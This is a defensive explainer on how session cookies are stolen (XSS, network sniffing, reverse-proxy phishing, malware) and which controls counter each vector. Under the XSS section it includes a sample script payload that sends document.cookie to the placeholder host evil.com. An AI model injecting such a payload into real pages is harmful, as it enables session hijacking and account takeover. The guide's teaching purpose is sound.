# How Cookies Get Stolen — and How to Stop It

Understanding attack vectors is essential for defenders. Here are the main ways session cookies are compromised, and the controls that prevent each one.

---

## Vector 1: Cross-Site Scripting (XSS)

**What happens:** Attacker injects JavaScript into your web page (via a comment, form input, URL parameter, etc.). That JavaScript reads `document.cookie` and sends it to the attacker.

**Example attack payload:**
```html
<script>
  new Image().src = "https://evil.com/?c=" + encodeURIComponent(document.cookie);
</script>
```

**Defenses:**
| Control | How it helps |
|---------|-------------|
| `HttpOnly` cookie flag | JS cannot read the cookie at all |
| Content Security Policy (CSP) header | Blocks inline scripts and untrusted script sources |
| Input validation / output encoding | Prevents XSS injection in the first place |
| WAF rules | Blocks common XSS payloads at the network edge |

---

## Vector 2: Network Interception (Man-in-the-Middle)

**What happens:** On an unencrypted (HTTP) connection, anyone on the same network can read all traffic — including cookies — with a packet sniffer like Wireshark.

**Defenses:**
| Control | How it helps |
|---------|-------------|
| `Secure` cookie flag | Cookie not sent on HTTP at all |
| Force HTTPS (`HSTS` header) | Browser refuses to connect via HTTP |
| Valid TLS certificate | Encrypts all traffic in transit |

---

## Vector 3: Reverse Proxy / Adversary-in-the-Middle

**What happens:** An attacker sets up a proxy between the victim and the real website. The victim logs in through the proxy, the proxy relays everything — including the session cookie after successful 2FA — and saves a copy.

**This is the technique that defeats standard 2FA.**

**Defenses:**
| Control | How it helps |
|---------|-------------|
| FIDO2 / Hardware security keys | Credentials are domain-bound — proxy can't relay them |
| Short session timeouts | Stolen cookie becomes useless quickly |
| IP binding on sessions | Session invalidated if IP changes mid-session |
| Certificate pinning | Detects unexpected TLS certificates |

---

## Vector 4: Physical Access / Malware

**What happens:** Attacker has access to the machine (or malware does) and reads cookie files from browser storage.

**Defenses:**
| Control | How it helps |
|---------|-------------|
| Full disk encryption | Protects cookie files at rest if device is stolen |
| Short session expiry | Old cookies useless quickly |
| Endpoint security / EDR | Detects malware reading browser files |
| Logout on idle | Removes active session when unattended |

---

## Key Takeaway for Defenders

No single control stops all vectors. Defense in depth:

```
HttpOnly          → stops XSS theft
Secure + HTTPS    → stops network interception
SameSite=Strict   → stops CSRF
Short expiry      → limits damage window if stolen
FIDO2             → stops proxy/phishing attacks
Disk encryption   → stops physical theft
```
